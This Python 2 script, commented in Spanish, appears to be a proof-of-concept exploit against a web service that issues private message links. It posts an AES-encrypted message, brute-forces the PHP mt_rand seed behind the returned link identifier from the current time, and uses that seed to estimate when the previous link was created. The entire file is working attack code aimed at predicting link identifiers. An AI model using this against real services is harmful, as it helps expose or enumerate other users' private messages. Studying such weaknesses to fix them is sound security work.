# -*- coding: utf-8 -*-

import sys
import requests
import base64
import binascii
import hashlib
from Crypto.Cipher import AES
import math
import time
import php_rand

###############################################################################

url = 'http://qlink'

###############################################################################

# sesión de módulo requests, para usar keep-alive
sess = requests.Session()

# encabezados http, copiados de un navegador
headers = {
        'Accept':'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'es-419,es;q=0.8',
        'Connection':'keep-alive',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Host':url.replace('http://', '').replace('https://', ''),
        'Origin':url,
        'Referer':url+'/',
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
        'X-Requested-With':'XMLHttpRequest'
}

# obtener token fresco
r = sess.get(url + '/tokenizer', headers=headers, data={})
x_token = r.json()['x_token']

# dentro de una función ahora
def generar_qlink(mensaje_ql):

    # generar parámetro simulando javascript de Date().getTime()
    random_hash = int(time.time()) * 1000

    # mensaje
    mensaje = mensaje_ql
    mensaje = "%%A%%" + mensaje + "%%C%%"

    # password, salt e iv cualesquiera
    password = b'123456'
    salt = "ffffffffffffffff"
    iv = "ffffffffffffffffffffffffffffffff"
    iters = 100

    # generación de llave para aes, simulando también versión original javascript
    llave = hashlib.pbkdf2_hmac('sha1', password, binascii.unhexlify(salt), iters, dklen=32)

    # cifrado
    cipher = AES.new(llave, AES.MODE_CBC, binascii.unhexlify(iv))
    data = base64.b64encode(cipher.encrypt(mensaje.ljust(int(math.ceil(len(mensaje) / 16.0) * 16), b'\0')))

    # para envío a web-service
    data = {
            'msg':'{"data":"' + data + '","salt":"' + salt + '","iv":"' + iv + '","iter":' + str(iters) + ',"decom":"false"}',
            'imprint':'false',
            'captcha':'false',
            'randomHash':random_hash,
            'from':'web_app',
            'x_token':x_token,
            'lang':'es',
            'replyIntent':'false',
            'n':'180'
    }

    # envío a servidor y retorno de qlink generado
    r = sess.post(url + '/inject', headers=headers, data=data)
    return r.json()['hash'] + '#' + password

# obtención de semilla por fuerza bruta desde máximo (fecha/hora actual)
def obtener_semilla(parcial_qlink):
    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    epoch = int(time.time())
    # aproximaciones...
    len_prueba = 60*60*24*1000*2 # probar a lo sumo dos días hacia atrás desde máximo posible 
    ii = 99999 + 999 + epoch * 1001
    max = 0
    for i in xrange(len_prueba):
        php_rand.mt_srand((0xFFFFFFFF & (ii-i)))
        for j in range(len(parcial_qlink)):
            g = php_rand.mt_rand(0, len(chars)-1)
            if chars[g] != parcial_qlink[j]:
                break
            if (j + 1 > max):
                max = j + 1
                if max == 10:
                    return ii-i
        if (i % 100000 == 0):
            print ".",
            sys.stdout.flush()

# generación de un qlink
ql = generar_qlink('prueba')
print 'qlink generado: ' + ql
sys.stdout.flush()

# obtener semilla
print 'obteniendo semilla...'
sys.stdout.flush()
ql_parcial = ql[len(url) + 5:len(url) + 15]
s = obtener_semilla(ql_parcial)
print
print 'semilla de qlink creado: ' + ql_parcial + ' -> ' + str(s)

# cálculo aproximado
t = int(time.time())
x_1 = (s - t) / 1000
x_2 = x_1 - 99

# impresión de rango estimado
print 'el qlink anterior al recientemente creado fue generado, aproximadamente, entre ' + time.ctime(x_2) + ' y ' + time.ctime(x_1)
